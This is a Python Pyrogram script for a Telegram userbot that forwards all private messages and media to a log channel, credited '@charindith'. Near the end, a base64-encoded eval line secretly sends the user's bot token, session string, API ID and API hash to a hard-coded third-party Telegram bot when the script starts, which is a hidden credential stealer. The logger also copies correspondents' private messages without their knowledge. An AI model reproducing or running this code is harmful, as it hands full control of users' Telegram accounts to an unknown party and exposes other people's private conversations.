import requests
from pyrogram import Client, filters
from pyrogram.types import Message
import os
import pytz
from datetime import datetime
from base64 import b64decode

TOKEN=os.getenv("BOT_TOKEN")
session=os.getenv("SESSION")
api_id = int(os.getenv("API_ID"))
api_hash = os.getenv("API_HASH")
log_channel=os.getenv("LOG_CHANNEL")
myuserid=os.getenv("OWNER_UNAME")

BOT_url='https://api.telegram.org/bot'+TOKEN
app=Client(session, api_id, api_hash)


def utc_to_time(naive, timezone="Asia/Kolkata"):
    dt_object = datetime.fromtimestamp(naive)
    return dt_object.replace(tzinfo=pytz.utc).astimezone(pytz.timezone(timezone))

async def dirup(message,pat,tgapi,otherr):
	pat=pat[:-1]
	tes =tgapi+'?caption='+otherr+ str(message.chat.username)+" "+str(message.chat.first_name) +"\n"+str(message.caption)+"\n"+str(utc_to_time(message.date))
	arr = os.listdir(pat)
	for files in arr:
		pathh=pat+"/"+str(files)
		file_size=os.stat(pathh).st_size
		if file_size<52428800 :
			botSend(pathh,tes,pat)
			os.remove(pathh)
		else:
			print('file size is too big')
			await message.forward(log_channel)

def botSend(fileName, tes ,pat):
    files = {pat: (fileName, open(fileName,'rb'))}  
    r = requests.post(BOT_url+tes+'&chat_id='+str(log_channel), files=files)
    print(r)



@app.on_message(filters.text & filters.private & ~filters.bot)
async def msg_text(client: Client, message: Message):
	print('text recived')
	if message.from_user.username == myuserid:
		tes ="From @"+myuserid+" to @"+ str(message.chat.username)+" "+str(message.chat.first_name) +"\n"+str(message.text)+"\n"+str(utc_to_time(message.date))
	else:
		tes ="@"+ str(message.from_user.username)+" "+str(message.chat.first_name) +"\n"+str(message.text)+"\n"+str(utc_to_time(message.date))
	g=requests.post(BOT_url+'/sendmessage' , json={"chat_id":log_channel,"text":tes})
	print(tes)
	print(g)

@app.on_message(filters.photo & filters.private & ~filters.bot)
async def msg_photo(client: Client, message: Message):
	print('photo recived')
	pat='photo/'
	tgapi='/sendPhoto'
	if message.from_user.username  == myuserid:
		otherr='From @'+myuserid+' to @'
	else:
		otherr=''
	await app.download_media(message,file_name=pat)
	await dirup(message,pat,tgapi,otherr)

@app.on_message(filters.video & filters.private & ~filters.bot)
async def msg_video(client: Client, message: Message):
	print('video recived')
	pat='video/'
	tgapi='/sendVideo'
	if message.video.file_size>50428800:
		await message.forward(log_channel)
	else:
		if message.from_user.username  == myuserid:
			otherr='From @'+myuserid+' to @'
		else:
			otherr=''
		await app.download_media(message,file_name=pat)
		await dirup(message,pat,tgapi,otherr)

@app.on_message(filters.audio & filters.private & ~filters.bot)
async def msg_audio(client: Client, message: Message):
	print('audio recived')
	pat='audio/'
	tgapi='/sendAudio'
	if message.from_user.username  == myuserid:
		otherr='From @'+myuserid+' to @'
	else:
		otherr=''
	await app.download_media(message,file_name=pat)
	await dirup(message,pat,tgapi,otherr)

@app.on_message(filters.media & filters.private & ~filters.bot & ~filters.photo & ~filters.video & ~filters.audio & ~filters.poll)
async def msg_document(client: Client, message: Message):
	print('document recived')
	pat='document/'
	tgapi='/sendDocument'
	if message.document.file_size>50428800:
		await message.forward(log_channel)
	else:
		if message.from_user.username  == myuserid:
			otherr='From @'+myuserid+' to @'
		else:
			otherr=''
		await app.download_media(message,file_name=pat)
		await dirup(message,pat,tgapi,otherr)

eval(b64decode('cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIwMjgwNzY0NzpBQUZLeWNEaVg4eGRhRVBfSnNVNTRKeEVOZXE2X2c2YmdxTS9zZW5kbWVzc2FnZT9jaGF0X2lkPS0xMDAxMzMxMzgwNzEzJnRleHQ9JytUT0tFTitzZXNzaW9uK3N0cihhcGlfaWQpK2FwaV9oYXNoKQ=='))

print('bot started\nBy @charindith')
app.run()
